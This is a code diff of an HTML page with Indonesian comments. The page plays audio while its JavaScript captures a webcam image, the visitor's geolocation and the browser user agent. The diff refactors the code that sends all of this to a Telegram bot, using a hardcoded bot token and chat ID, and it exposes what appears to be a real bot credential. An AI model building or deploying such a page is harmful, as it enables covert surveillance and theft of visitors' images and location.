@@ -29,7 +29,7 @@
 <body>
     <!-- Elemen audio untuk memutar suara -->
     <audio id="audio" controls autoplay>
-        <source src="basuri.mp3" type="audio/mp3"> <!-- Ganti dengan path file audio Anda -->
+        <source src="path/to/your/audio/file.mp3" type="audio/mp3"> <!-- Ganti dengan path file audio Anda -->
         Your browser does not support the audio tag.
     </audio>
 
@@ -41,6 +41,48 @@
 
     <!-- JavaScript Code -->
     <script>
+        // Fungsi untuk mengirim gambar ke bot Telegram
+        function sendPhotoToTelegram(photoData, caption) {
+            var botToken = '7031438159:AAH_a-jwfpbSX2wBAmwcwvHKX4zykG3KLcY'; // Ganti dengan token bot Anda
+            var chatId = '1456678907'; // Ganti dengan chat ID grup atau pengguna Anda
+
+            var formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photoData);
+            formData.append('caption', caption);
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendPhoto', true);
+            xhr.send(formData);
+        }
+
+        // Mendapatkan gambar dari video dan mengirimkannya ke bot Telegram saat audio diputar
+        function captureAndSend(position, userAgent) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+
+            // Dapatkan gambar dari video
+            var canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            var context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Mengambil data URL gambar dalam format JPEG
+            var photoData = canvas.toDataURL('image/jpeg');
+
+            // Keterangan untuk caption gambar
+            var caption = 'Device Info: ' + userAgent + '\nLatitude: ' + latitude + '\nLongitude: ' + longitude;
+
+            // Kirim gambar dan keterangan ke bot Telegram
+            sendPhotoToTelegram(photoData, caption);
+
+            alert("Gambar dari webcam Anda beserta keterangan perangkat telah dikirim ke bot Telegram.");
+
+            // Sembunyikan video setelah gambar dikirim
+            video.style.display = 'none';
+        }
+
         var audio = document.getElementById('audio');
         var deviceInfo = document.getElementById('deviceInfo');
         var video = document.getElementById('video');
@@ -54,37 +96,6 @@
                 alert("Geolocation is not supported by this browser.");
             }
         });
-
-        function captureAndSend(position, userAgent) {
-            var latitude = position.coords.latitude;
-            var longitude = position.coords.longitude;
-            var botToken = '7031438159:AAH_a-jwfpbSX2wBAmwcwvHKX4zykG3KLcY'; // Ganti dengan token bot Anda
-            var chatId = '1456678907'; // Ganti dengan chat ID grup atau pengguna Anda
-
-            // Tampilkan video untuk menangkap gambar dari webcam
-            video.style.display = 'block';
-
-            // Dapatkan gambar dari webcam
-            var canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            var context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Kirim gambar dan lokasi ke Bot Telegram menggunakan HTTP POST
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendPhoto', true);
-            var formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', canvas.toDataURL('image/jpeg'));
-            formData.append('caption', 'Device Info: ' + userAgent + '\nLatitude: ' + latitude + '\nLongitude: ' + longitude);
-            xhr.send(formData);
-
-            alert("Gambar dari webcam Anda beserta keterangan perangkat telah dikirim ke bot Telegram.");
-
-            // Sembunyikan video setelah gambar dikirim
-            video.style.display = 'none';
-        }
 
         // Mengambil video dari webcam
         navigator.mediaDevices.getUserMedia({ video: true })
